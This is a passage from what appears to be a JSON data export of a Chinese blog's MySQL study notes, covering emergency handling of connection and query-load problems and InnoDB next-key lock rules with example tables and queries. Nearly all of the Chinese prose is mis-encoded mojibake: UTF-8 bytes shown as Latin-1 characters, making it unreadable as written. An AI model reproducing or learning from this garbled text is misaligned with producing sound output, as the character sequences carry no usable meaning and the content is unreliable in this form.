MySQLï¼Œå¦‚æœæˆ‘ä»¬æŠŠå®ƒæ”¹å¾—å¤ªå¤§ï¼Œè®©æ›´å¤šçš„è¿æ¥éƒ½å¯ä»¥è¿›æ¥ï¼Œé‚£ä¹ˆç³»ç»Ÿçš„è´Ÿè½½å¯èƒ½ä¼šè¿›ä¸€æ­¥åŠ å¤§ï¼Œå¤§é‡çš„èµ„æºè€—è´¹åœ¨æƒé™éªŒè¯ç­‰é€»è¾‘ä¸Šï¼Œç»“æœå¯èƒ½æ˜¯é€‚å¾—å…¶åï¼Œå·²ç»è¿æ¥çš„çº¿ç¨‹æ‹¿ä¸åˆ° CPU èµ„æºå»æ‰§è¡Œä¸šåŠ¡çš„ SQL è¯·æ±‚ã€‚ é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œä½ è¿˜æœ‰æ²¡æœ‰åˆ«çš„å»ºè®®å‘¢ï¼Ÿæˆ‘è¿™é‡Œè¿˜æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä½†è¦æ³¨æ„ï¼Œè¿™äº›æ–¹æ³•éƒ½æ˜¯æœ‰æŸçš„ã€‚ å…ˆå¤„ç†æ‰é‚£äº›å ç€è¿æ¥ä½†æ˜¯ä¸å·¥ä½œçš„çº¿ç¨‹max_connections çš„è®¡ç®—ï¼Œä¸æ˜¯çœ‹è°åœ¨ runningï¼Œæ˜¯åªè¦è¿ç€å°±å ç”¨ä¸€ä¸ªè®¡æ•°ä½ç½®ã€‚å¯¹äºé‚£äº›ä¸éœ€è¦ä¿æŒçš„è¿æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ kill connection ä¸»åŠ¨è¸¢æ‰ã€‚è¿™ä¸ªè¡Œä¸ºè·Ÿäº‹å…ˆè®¾ç½® wait_timeout çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚è®¾ç½® wait_timeout å‚æ•°è¡¨ç¤ºçš„æ˜¯ï¼Œä¸€ä¸ªçº¿ç¨‹ç©ºé—² wait_timeout è¿™ä¹ˆå¤šç§’ä¹‹åï¼Œå°±ä¼šè¢« MySQL ç›´æ¥æ–­å¼€è¿æ¥ã€‚ ä»æ•°æ®åº“ç«¯ä¸»åŠ¨æ–­å¼€è¿æ¥å¯èƒ½æ˜¯æœ‰æŸçš„ï¼Œå°¤å…¶æ˜¯æœ‰çš„åº”ç”¨ç«¯æ”¶åˆ°è¿™ä¸ªé”™è¯¯åï¼Œä¸é‡æ–°è¿æ¥ï¼Œè€Œæ˜¯ç›´æ¥ç”¨è¿™ä¸ªå·²ç»ä¸èƒ½ç”¨çš„å¥æŸ„é‡è¯•æŸ¥è¯¢ã€‚è¿™ä¼šå¯¼è‡´ä»åº”ç”¨ç«¯çœ‹ä¸Šå»ï¼Œâ€œMySQL ä¸€ç›´æ²¡æ¢å¤â€ã€‚ å‡å°‘è¿æ¥è¿‡ç¨‹çš„æ¶ˆè€—æœ‰çš„ä¸šåŠ¡ä»£ç ä¼šåœ¨çŸ­æ—¶é—´å†…å…ˆå¤§é‡ç”³è¯·æ•°æ®åº“è¿æ¥åšå¤‡ç”¨ï¼Œå¦‚æœç°åœ¨æ•°æ®åº“ç¡®è®¤æ˜¯è¢«è¿æ¥è¡Œä¸ºæ‰“æŒ‚äº†ï¼Œé‚£ä¹ˆä¸€ç§å¯èƒ½çš„åšæ³•ï¼Œæ˜¯è®©æ•°æ®åº“è·³è¿‡æƒé™éªŒè¯é˜¶æ®µã€‚ è·³è¿‡æƒé™éªŒè¯çš„æ–¹æ³•æ˜¯ï¼šé‡å¯æ•°æ®åº“ï¼Œå¹¶ä½¿ç”¨â€“skip-grant-tables å‚æ•°å¯åŠ¨ã€‚è¿™æ ·ï¼Œæ•´ä¸ª MySQL ä¼šè·³è¿‡æ‰€æœ‰çš„æƒé™éªŒè¯é˜¶æ®µï¼ŒåŒ…æ‹¬è¿æ¥è¿‡ç¨‹å’Œè¯­å¥æ‰§è¡Œè¿‡ç¨‹åœ¨å†…ã€‚ ä½†æ˜¯ï¼Œè¿™ç§æ–¹æ³•ç‰¹åˆ«ç¬¦åˆæˆ‘ä»¬æ ‡é¢˜é‡Œè¯´çš„â€œé¥®é¸©æ­¢æ¸´â€ï¼Œé£é™©æé«˜ï¼Œæ˜¯æˆ‘ç‰¹åˆ«ä¸å»ºè®®ä½¿ç”¨çš„æ–¹æ¡ˆã€‚å°¤å…¶ä½ çš„åº“å¤–ç½‘å¯è®¿é—®çš„è¯ï¼Œå°±æ›´ä¸èƒ½è¿™ä¹ˆåšäº†ã€‚ åœ¨ MySQL 8.0 ç‰ˆæœ¬é‡Œï¼Œå¦‚æœä½ å¯ç”¨â€“skip-grant-tables å‚æ•°ï¼ŒMySQL ä¼šé»˜è®¤æŠŠ â€“skip-networking å‚æ•°æ‰“å¼€ï¼Œè¡¨ç¤ºè¿™æ—¶å€™æ•°æ®åº“åªèƒ½è¢«æœ¬åœ°çš„å®¢æˆ·ç«¯è¿æ¥ã€‚å¯è§ï¼ŒMySQL å®˜æ–¹å¯¹ skip-grant-tables è¿™ä¸ªå‚æ•°çš„å®‰å…¨é—®é¢˜ä¹Ÿå¾ˆé‡è§†ã€‚ é™¤äº†çŸ­è¿æ¥æ•°æš´å¢å¯èƒ½ä¼šå¸¦æ¥æ€§èƒ½é—®é¢˜å¤–ï¼Œå®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨çº¿ä¸Šç¢°åˆ°æ›´å¤šçš„æ˜¯æŸ¥è¯¢æˆ–è€…æ›´æ–°è¯­å¥å¯¼è‡´çš„æ€§èƒ½é—®é¢˜ã€‚å…¶ä¸­ï¼ŒæŸ¥è¯¢é—®é¢˜æ¯”è¾ƒå…¸å‹çš„æœ‰ä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ç”±æ–°å‡ºç°çš„æ…¢æŸ¥è¯¢å¯¼è‡´çš„ï¼Œä¸€ç±»æ˜¯ç”± QPSï¼ˆæ¯ç§’æŸ¥è¯¢æ•°ï¼‰çªå¢å¯¼è‡´çš„ã€‚è€Œå…³äºæ›´æ–°è¯­å¥å¯¼è‡´çš„æ€§èƒ½é—®é¢˜ï¼Œæˆ‘ä¼šåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« å’Œä½ å±•å¼€è¯´æ˜ã€‚ æ…¢æŸ¥è¯¢æ€§èƒ½é—®é¢˜åœ¨ MySQL ä¸­ï¼Œä¼šå¼•å‘æ€§èƒ½é—®é¢˜çš„æ…¢æŸ¥è¯¢ï¼Œå¤§ä½“æœ‰ä»¥ä¸‹ä¸‰ç§å¯èƒ½ï¼š ç´¢å¼•æ²¡æœ‰è®¾è®¡å¥½ SQL è¯­å¥æ²¡å†™å¥½ MySQL é€‰é”™äº†ç´¢å¼• å¯èƒ½ä¸€è¿™ç§åœºæ™¯ä¸€èˆ¬å°±æ˜¯é€šè¿‡ç´§æ€¥åˆ›å»ºç´¢å¼•æ¥è§£å†³ã€‚MySQL 5.6 ç‰ˆæœ¬ä»¥åï¼Œåˆ›å»ºç´¢å¼•éƒ½æ”¯æŒ Online DDL äº†ï¼Œå¯¹äºé‚£ç§é«˜å³°æœŸæ•°æ®åº“å·²ç»è¢«è¿™ä¸ªè¯­å¥æ‰“æŒ‚äº†çš„æƒ…å†µï¼Œæœ€é«˜æ•ˆçš„åšæ³•å°±æ˜¯ç›´æ¥æ‰§è¡Œ alter table è¯­å¥ã€‚ å¯èƒ½äºŒæ¯”å¦‚ï¼Œæˆ‘ä»¬çŠ¯äº†åœ¨ç¬¬ 18 ç¯‡æ–‡ç« ã€Šä¸ºä»€ä¹ˆè¿™äº› SQL è¯­å¥é€»è¾‘ç›¸åŒï¼Œæ€§èƒ½å´å·®å¼‚å·¨å¤§ï¼Ÿã€‹ä¸­æåˆ°çš„é‚£äº›é”™è¯¯ï¼Œå¯¼è‡´è¯­å¥æ²¡æœ‰ä½¿ç”¨ä¸Šç´¢å¼•ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ”¹å†™ SQL è¯­å¥æ¥å¤„ç†ã€‚MySQL 5.7 æä¾›äº† query_rewrite åŠŸèƒ½ï¼Œå¯ä»¥æŠŠè¾“å…¥çš„ä¸€ç§è¯­å¥æ”¹å†™æˆå¦å¤–ä¸€ç§æ¨¡å¼ã€‚ å¯èƒ½ä¸‰è¿˜æœ‰ä¸€ä¸ªå¯èƒ½å°±æ˜¯ç¢°ä¸Šäº†æˆ‘ä»¬åœ¨ç¬¬ 10 ç¯‡æ–‡ç« ã€ŠMySQL ä¸ºä»€ä¹ˆæœ‰æ—¶å€™ä¼šé€‰é”™ç´¢å¼•ï¼Ÿã€‹ä¸­æåˆ°çš„æƒ…å†µï¼ŒMySQL é€‰é”™äº†ç´¢å¼•ã€‚ è¿™æ—¶å€™ï¼Œåº”æ€¥æ–¹æ¡ˆå°±æ˜¯ç»™è¿™ä¸ªè¯­å¥åŠ ä¸Š force indexã€‚ åŒæ ·åœ°ï¼Œä½¿ç”¨æŸ¥è¯¢é‡å†™åŠŸèƒ½ï¼Œç»™åŸæ¥çš„è¯­å¥åŠ ä¸Š force indexï¼Œä¹Ÿå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ QPS çªå¢é—®é¢˜æœ‰æ—¶å€™ç”±äºä¸šåŠ¡çªç„¶å‡ºç°é«˜å³°ï¼Œæˆ–è€…åº”ç”¨ç¨‹åº bugï¼Œå¯¼è‡´æŸä¸ªè¯­å¥çš„ QPS çªç„¶æš´æ¶¨ï¼Œä¹Ÿå¯èƒ½å¯¼è‡´ MySQL å‹åŠ›è¿‡å¤§ï¼Œå½±å“æœåŠ¡ã€‚ å¯¹äºè¿™ç±»é—®é¢˜ï¼Œæœ€ç†æƒ³çš„æƒ…å†µæ˜¯è®©ä¸šåŠ¡æŠŠè¿™ä¸ªåŠŸèƒ½ä¸‹æ‰ï¼ŒæœåŠ¡è‡ªç„¶å°±ä¼šæ¢å¤ã€‚ ä¸€ç§æ˜¯ç”±å…¨æ–°ä¸šåŠ¡çš„ bug å¯¼è‡´çš„ã€‚å‡è®¾ä½ çš„ DB è¿ç»´æ˜¯æ¯”è¾ƒè§„èŒƒçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç™½åå•æ˜¯ä¸€ä¸ªä¸ªåŠ çš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä½ èƒ½å¤Ÿç¡®å®šä¸šåŠ¡æ–¹ä¼šä¸‹æ‰è¿™ä¸ªåŠŸèƒ½ï¼Œåªæ˜¯æ—¶é—´ä¸Šæ²¡é‚£ä¹ˆå¿«ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»æ•°æ®åº“ç«¯ç›´æ¥æŠŠç™½åå•å»æ‰ã€‚ å¦‚æœè¿™ä¸ªæ–°åŠŸèƒ½ä½¿ç”¨çš„æ˜¯å•ç‹¬çš„æ•°æ®åº“ç”¨æˆ·ï¼Œå¯ä»¥ç”¨ç®¡ç†å‘˜è´¦å·æŠŠè¿™ä¸ªç”¨æˆ·åˆ æ‰ï¼Œç„¶åæ–­å¼€ç°æœ‰è¿æ¥ã€‚è¿™æ ·ï¼Œè¿™ä¸ªæ–°åŠŸèƒ½çš„è¿æ¥ä¸æˆåŠŸï¼Œç”±å®ƒå¼•å‘çš„ QPS å°±ä¼šå˜æˆ 0ã€‚ å¦‚æœè¿™ä¸ªæ–°å¢çš„åŠŸèƒ½è·Ÿä¸»ä½“åŠŸèƒ½æ˜¯éƒ¨ç½²åœ¨ä¸€èµ·çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½é€šè¿‡å¤„ç†è¯­å¥æ¥é™åˆ¶ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šé¢æåˆ°çš„æŸ¥è¯¢é‡å†™åŠŸèƒ½ï¼ŒæŠŠå‹åŠ›æœ€å¤§çš„ SQL è¯­å¥ç›´æ¥é‡å†™æˆâ€select 1â€è¿”å›ã€‚ å½“ç„¶ï¼Œè¿™ä¸ªæ“ä½œçš„é£é™©å¾ˆé«˜ï¼Œéœ€è¦ä½ ç‰¹åˆ«ç»†è‡´ã€‚å®ƒå¯èƒ½å­˜åœ¨ä¸¤ä¸ªå‰¯ä½œç”¨ï¼š å¦‚æœåˆ«çš„åŠŸèƒ½é‡Œé¢ä¹Ÿç”¨åˆ°äº†è¿™ä¸ª SQL è¯­å¥æ¨¡æ¿ï¼Œä¼šæœ‰è¯¯ä¼¤ï¼› å¾ˆå¤šä¸šåŠ¡å¹¶ä¸æ˜¯é è¿™ä¸€ä¸ªè¯­å¥å°±èƒ½å®Œæˆé€»è¾‘çš„ï¼Œæ‰€ä»¥å¦‚æœå•ç‹¬æŠŠè¿™ä¸€ä¸ªè¯­å¥ä»¥ select 1 çš„ç»“æœè¿”å›çš„è¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´åé¢çš„ä¸šåŠ¡é€»è¾‘ä¸€èµ·å¤±è´¥ã€‚ æ€»ç»“ å®é™…å¼€å‘ä¸­ï¼Œéœ€è¦å°½é‡é¿å…ä¸€äº›ä½æ•ˆçš„æ–¹æ³•ï¼Œæ¯”å¦‚é¿å…å¤§é‡åœ°ä½¿ç”¨çŸ­è¿æ¥ æ²¡æœ‰å®Œç¾çš„è§£å†³æ–¹æ¡ˆï¼Œå¦‚æœæœ‰çš„è¯ï¼Œè‚¯å®šä¹Ÿä¸è‡³äºç­‰åˆ°é—®é¢˜å·²ç»å‘ç”Ÿäº†æ‰ä¸Šåœº","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"21 ä¸ºä»€ä¹ˆæˆ‘åªæ”¹ä¸€è¡Œçš„è¯­å¥ï¼Œé”è¿™ä¹ˆå¤š","slug":"why-do-I-only-change-one-line-of-the-statement-so-many-locks","date":"2022-08-16T00:51:07.000Z","updated":"2023-02-18T03:28:33.608Z","comments":true,"path":"why-do-I-only-change-one-line-of-the-statement-so-many-locks/","link":"","permalink":"https://www.0x2beace.com/why-do-I-only-change-one-line-of-the-statement-so-many-locks/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ next-key lock çš„åŠ é”è§„åˆ™ é€šè¿‡å„ç§æ¡ˆä¾‹åŠ æ·±å¯¹ next-key lock çš„ç†è§£","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ next-key lock çš„åŠ é”è§„åˆ™ é€šè¿‡å„ç§æ¡ˆä¾‹åŠ æ·±å¯¹ next-key lock çš„ç†è§£ ä¸‹é¢çš„ç¤ºä¾‹éƒ½æ˜¯åŸºäºè¡¨ t è¿›è¡Œå±•å¼€çš„ï¼Œå»ºè¡¨å’Œåˆå§‹åŒ–è¯­å¥å¦‚ä¸‹ï¼š 12345678910CREATE TABLE &#96;t&#96; ( &#96;id&#96; int(11) NOT NULL, &#96;c&#96; int(11) DEFAULT NULL, &#96;d&#96; int(11) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;c&#96; (&#96;c&#96;)) ENGINE&#x3D;InnoDB; insert into t values(0,0,0),(5,5,5),(10,10,10),(15,15,15),(20,20,20),(25,25,25); ä¸‹é¢æ‰€æœ‰æ¡ˆä¾‹éƒ½æ˜¯åœ¨å¯é‡å¤è¯»éš”ç¦»çº§åˆ« (repeatable-read) ä¸‹éªŒè¯çš„ã€‚åŒæ—¶ï¼Œå¯é‡å¤è¯»éš”ç¦»çº§åˆ«éµå®ˆä¸¤é˜¶æ®µé”åè®®ï¼Œæ‰€æœ‰åŠ é”çš„èµ„æºï¼Œéƒ½æ˜¯åœ¨äº‹åŠ¡æäº¤æˆ–è€…å›æ»šçš„æ—¶å€™æ‰é‡Šæ”¾çš„ã€‚ åŠ é”è§„åˆ™ï¼š åŸåˆ™ 1ï¼šåŠ é”çš„åŸºæœ¬å•ä½æ˜¯ next-key lockã€‚å¸Œæœ›ä½ è¿˜è®°å¾—ï¼Œnext-key lock æ˜¯å‰å¼€åé—­åŒºé—´ã€‚ åŸåˆ™ 2ï¼šæŸ¥æ‰¾è¿‡ç¨‹ä¸­è®¿é—®åˆ°çš„å¯¹è±¡æ‰ä¼šåŠ é”ã€‚ ä¼˜åŒ– 1ï¼šç´¢å¼•ä¸Šçš„ç­‰å€¼æŸ¥è¯¢ï¼Œç»™å”¯ä¸€ç´¢å¼•åŠ é”çš„æ—¶å€™ï¼Œnext-key lock é€€åŒ–ä¸ºè¡Œé”ã€‚ ä¼˜åŒ– 2ï¼šç´¢å¼•ä¸Šçš„ç­‰å€¼æŸ¥è¯¢ï¼Œå‘å³éå†æ—¶ä¸”æœ€åä¸€ä¸ªå€¼ä¸æ»¡è¶³ç­‰å€¼æ¡ä»¶çš„æ—¶å€™ï¼Œnext-key lock é€€åŒ–ä¸ºé—´éš™é”ã€‚ ä¸€ä¸ª bugï¼šå”¯ä¸€ç´¢å¼•ä¸Šçš„èŒƒå›´æŸ¥è¯¢ä¼šè®¿é—®åˆ°ä¸æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€ä¸ªå€¼ä¸ºæ­¢ã€‚ æ¡ˆä¾‹ä¸€ï¼šç­‰å€¼æŸ¥è¯¢é—´éš™é”ç­‰å€¼æ¡ä»¶æ“ä½œé—´éš™ï¼š å½“ä½¿ç”¨ update t set d=d+1 where id = 7 æ—¶ï¼Œå°±ç»™è¡¨ t çš„ 6 ä¸ªè®°å½•åŠ ä¸Šäº†è¡Œé”ï¼Œè¿˜åŒæ—¶åŠ äº† 7 ä¸ªé—´éš™é”ã€‚ ç”±äºè¡¨ t ä¸­æ²¡æœ‰ id=7 çš„è®°å½•ï¼Œæ‰€ä»¥ç”¨æˆ‘ä»¬ä¸Šé¢æåˆ°çš„åŠ é”è§„åˆ™åˆ¤æ–­ä¸€ä¸‹çš„è¯ï¼š æ ¹æ®åŸåˆ™ 1ï¼ŒåŠ é”å•ä½æ˜¯ next-key lockï¼Œsession A åŠ é”èŒƒå›´å°±æ˜¯ (5,10]ï¼› åŒæ—¶æ ¹æ®ä¼˜åŒ– 2ï¼Œè¿™æ˜¯ä¸€ä¸ªç­‰å€¼æŸ¥è¯¢ (id=7)ï¼Œè€Œ id=10 ä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶ï¼Œnext-key lock é€€åŒ–æˆé—´éš™é”ï¼Œå› æ­¤æœ€ç»ˆåŠ é”çš„èŒƒå›´æ˜¯ (5,10)ã€‚ æ‰€ä»¥ï¼Œsession B è¦å¾€è¿™ä¸ªé—´éš™é‡Œé¢æ’å…¥ id=8 çš„è®°å½•ä¼šè¢«é”ä½ï¼Œä½†æ˜¯ session C ä¿®æ”¹ id=10 è¿™è¡Œæ˜¯å¯ä»¥çš„ã€‚ æ¡ˆä¾‹äºŒï¼šéå”¯ä¸€ç´¢å¼•ç­‰å€¼é”è¦†ç›–ç´¢å¼•ä¸Šçš„é”ï¼š session A çš„æŸ¥è¯¢æ˜¯è¦†ç›–ç´¢å¼•ï¼Œå¹¶ä¸”ä½¿ç”¨ lock in share modeï¼Œå› æ­¤ç´¢å¼• c ä¸Š c=5 çš„è¿™ä¸€è¡Œä¼šè¢«åŠ ä¸Šè¯»é”ã€‚ æ ¹æ®åŸåˆ™ 1ï¼ŒåŠ é”å•ä½æ˜¯ next-key lockï¼Œå› æ­¤ä¼šç»™ (0,5] åŠ ä¸Š next-key lockã€‚ è¦æ³¨æ„ c æ˜¯æ™®é€šç´¢å¼•ï¼Œå› æ­¤ä»…è®¿é—® c=5 è¿™ä¸€æ¡è®°å½•æ˜¯ä¸èƒ½é©¬ä¸Šåœä¸‹æ¥çš„ï¼Œéœ€è¦å‘å³éå†ï¼ŒæŸ¥åˆ° c=10 æ‰æ”¾å¼ƒã€‚æ ¹æ®åŸåˆ™ 2ï¼Œè®¿é—®åˆ°çš„éƒ½è¦åŠ é”ï¼Œå› æ­¤è¦ç»™ (5,10] åŠ  next-key lockã€‚ ä½†æ˜¯åŒæ—¶è¿™ä¸ªç¬¦åˆä¼˜åŒ– 2ï¼šç­‰å€¼åˆ¤æ–­ï¼Œå‘å³éå†ï¼Œæœ€åä¸€ä¸ªå€¼ä¸æ»¡è¶³ c=5 è¿™ä¸ªç­‰å€¼æ¡ä»¶ï¼Œå› æ­¤é€€åŒ–æˆé—´éš™é” (5,10)ã€‚ æ ¹æ®åŸåˆ™ 2 ï¼Œåªæœ‰è®¿é—®åˆ°çš„å¯¹è±¡æ‰ä¼šåŠ é”ï¼Œè¿™ä¸ªæŸ¥è¯¢ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œå¹¶ä¸éœ€è¦è®¿é—®ä¸»é”®ç´¢å¼•ï¼Œæ‰€ä»¥ä¸»é”®ç´¢å¼•ä¸Šæ²¡æœ‰åŠ ä»»ä½•é”ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ session B çš„ update è¯­å¥å¯ä»¥æ‰§è¡Œå®Œæˆã€‚ ç”±äºsession C è¦æ’å…¥ä¸€ä¸ª (7,7,7) çš„è®°å½•ï¼Œå› æ­¤ä¼šè¢« session A çš„é—´éš™é” (5,10) é”ä½ã€‚ æ¡ˆä¾‹ä¸‰ï¼šä¸»é”®ç´¢å¼•èŒƒå›´é”12mysql&gt; select * from t where id&#x3D;10 for update;mysql&gt; select * from t where id&gt;&#x3D;10 and id&lt;11 for update; åœ¨é€»è¾‘ä¸Šï¼Œè¿™ä¸¤æ¡æŸ¥è¯­å¥è‚¯å®šæ˜¯ç­‰ä»·çš„ï¼Œä½†æ˜¯å®ƒä»¬çš„åŠ é”è§„åˆ™ä¸å¤ªä¸€æ ·ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å°±è®© session A æ‰§è¡Œç¬¬äºŒä¸ªæŸ¥è¯¢è¯­å¥ï¼Œæ¥çœ‹çœ‹åŠ é”æ•ˆæœã€‚ å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ï¼Œè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ª id=10 çš„è¡Œï¼Œå› æ­¤æœ¬è¯¥æ˜¯ next-key lock(5,10]ã€‚ æ ¹æ®ä¼˜åŒ– 1ï¼Œ ä¸»é”® id ä¸Šçš„ç­‰å€¼æ¡ä»¶ï¼Œé€€åŒ–æˆè¡Œé”ï¼ŒåªåŠ äº† id=10 è¿™ä¸€è¡Œçš„è¡Œé”ã€‚ èŒƒå›´æŸ¥æ‰¾å°±å¾€åç»§ç»­æ‰¾ï¼Œæ‰¾åˆ° id=15 è¿™ä¸€è¡Œåœä¸‹æ¥ï¼Œå› æ­¤éœ€è¦åŠ  next-key lock(10,15]ã€‚ æ‰€ä»¥ï¼Œsession A è¿™æ—¶å€™é”çš„èŒƒå›´å°±æ˜¯ä¸»é”®ç´¢å¼•ä¸Šï¼Œè¡Œé” id=10 å’Œ next-key lock(10,15]ã€‚è¿™æ ·ï¼Œsession B å’Œ session C çš„ç»“æœä½ å°±èƒ½ç†è§£äº†ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¦–æ¬¡ session A å®šä½æŸ¥æ‰¾ id=10 çš„è¡Œçš„æ—¶å€™ï¼Œæ˜¯å½“åšç­‰å€¼æŸ¥è¯¢æ¥åˆ¤æ–­çš„ï¼Œè€Œå‘å³æ‰«æåˆ° id=15 çš„æ—¶å€™ï¼Œç”¨çš„æ˜¯èŒƒå›´æŸ¥è¯¢åˆ¤æ–­ã€‚ æ¡ˆä¾‹å››ï¼šéå”¯ä¸€ç´¢å¼•èŒƒå›´é”æ¡ˆä¾‹å››å’Œæ¡ˆä¾‹ä¸‰å¾ˆåƒï¼ŒåŒºåˆ«åœ¨äºæ¡ˆä¾‹å››ä½¿ç”¨çš„æ˜¯éå”¯ä¸€ç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šè§¦å‘ä¼˜åŒ–è§„åˆ™ã€‚ åœ¨ç¬¬ä¸€æ¬¡ç”¨ c=10 å®šä½è®°å½•çš„æ—¶å€™ï¼Œç´¢å¼• c ä¸ŠåŠ äº† (5,10] è¿™ä¸ª next-key lock åï¼Œç”±äºç´¢å¼• c æ˜¯éå”¯ä¸€ç´¢å¼•ï¼Œæ²¡æœ‰ä¼˜åŒ–è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ä¼šèœ•å˜ä¸ºè¡Œé”ï¼Œå› æ­¤æœ€ç»ˆ sesion A åŠ çš„é”æ˜¯ï¼Œç´¢å¼• c ä¸Šçš„ (5,10] å’Œ (10,15] è¿™ä¸¤ä¸ª next-key lockã€‚ æ‰€ä»¥ä»ç»“æœä¸Šæ¥çœ‹ï¼Œsesson B è¦æ’å…¥ï¼ˆ8,8,8) çš„è¿™ä¸ª insert è¯­å¥æ—¶å°±è¢«å µä½äº†ã€‚ è¿™é‡Œéœ€è¦æ‰«æåˆ° c=15 æ‰åœæ­¢æ‰«æï¼Œæ˜¯åˆç†çš„ï¼Œå› ä¸º InnoDB è¦æ‰«åˆ° c=15ï¼Œæ‰çŸ¥é“ä¸éœ€è¦ç»§ç»­å¾€åæ‰¾äº†ã€‚ æ¡ˆä¾‹äº”ï¼šå”¯ä¸€ç´¢å¼•èŒƒå›´é” bugå‰é¢çš„å››ä¸ªæ¡ˆä¾‹ï¼Œæˆ‘ä»¬å·²ç»ç”¨åˆ°äº†åŠ é”è§„åˆ™ä¸­çš„ä¸¤ä¸ªåŸåˆ™å’Œä¸¤ä¸ªä¼˜åŒ–ï¼Œæ¥ä¸‹æ¥å†çœ‹ä¸€ä¸ªå…³äºåŠ é”è§„åˆ™ä¸­ bug çš„æ¡ˆä¾‹ã€‚ session A æ˜¯ä¸€ä¸ªèŒƒå›´æŸ¥è¯¢ï¼ŒæŒ‰ç…§åŸåˆ™ 1 çš„è¯ï¼Œåº”è¯¥æ˜¯ç´¢å¼• id ä¸ŠåªåŠ  (10,15] è¿™ä¸ª next-key lockï¼Œå¹¶ä¸”å› ä¸º id æ˜¯å”¯ä¸€é”®ï¼Œæ‰€ä»¥å¾ªç¯åˆ¤æ–­åˆ° id=15 è¿™ä¸€è¡Œå°±åº”è¯¥åœæ­¢äº†ã€‚ ä½†æ˜¯å®ç°ä¸Šï¼ŒInnoDB ä¼šå¾€å‰æ‰«æåˆ°ç¬¬ä¸€ä¸ªä¸æ»¡è¶³æ¡ä»¶çš„è¡Œä¸ºæ­¢ï¼Œä¹Ÿå°±æ˜¯ id=20ã€‚è€Œä¸”ç”±äºè¿™æ˜¯ä¸ªèŒƒå›´æ‰«æï¼Œå› æ­¤ç´¢å¼• id ä¸Šçš„ (15,20] è¿™ä¸ª next-key lock ä¹Ÿä¼šè¢«é”ä¸Šã€‚ æ‰€ä»¥ä½ çœ‹åˆ°äº†ï¼Œsession B è¦æ›´æ–° id=20 è¿™ä¸€è¡Œï¼Œæ˜¯ä¼šè¢«é”ä½çš„ã€‚åŒæ ·åœ°ï¼Œsession C è¦æ’å…¥ id=16 çš„ä¸€è¡Œï¼Œä¹Ÿä¼šè¢«é”ä½ã€‚ æ¡ˆä¾‹å…­ï¼šéå”¯ä¸€ç´¢å¼•ä¸Šå­˜åœ¨â€ç­‰å€¼â€çš„ä¾‹å­æ¥ä¸‹æ¥çš„ä¾‹å­ï¼Œæ˜¯ä¸ºäº†æ›´å¥½åœ°è¯´æ˜â€œé—´éš™â€è¿™ä¸ªæ¦‚å¿µã€‚è¿™é‡Œï¼Œæˆ‘ç»™è¡¨ t æ’å…¥ä¸€æ¡æ–°è®°å½•ã€‚ 1insert into t values(30,10,30); æ–°æ’å…¥çš„è¿™ä¸€è¡Œï¼Œcçš„å€¼ä¹Ÿæ˜¯ 10ï¼Œå› ä¸º c æ˜¯éå”¯ä¸€ç´¢å¼•ï¼Œè€Œéå”¯ä¸€ç´¢å¼•ä¸ŠåŒ…å«ä¸»é”®çš„å€¼ã€‚é‚£ä¹ˆï¼Œè¿™æ—¶å€™ç´¢å¼• c ä¸Šçš„é—´éš™æ˜¯ä»€ä¹ˆçŠ¶æ€äº†å‘¢ï¼Ÿ ç´¢å¼•c å¯¹åº”çš„ä¸»é”®çš„å€¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æœ‰ä¸¤ä¸ª c=10ï¼Œä½†æ˜¯å®ƒä»¬çš„ä¸»é”®å€¼ id æ˜¯ä¸åŒçš„ï¼ˆåˆ†åˆ«æ˜¯ 10 å’Œ 30ï¼‰ï¼Œå› æ­¤è¿™ä¸¤ä¸ª c=10 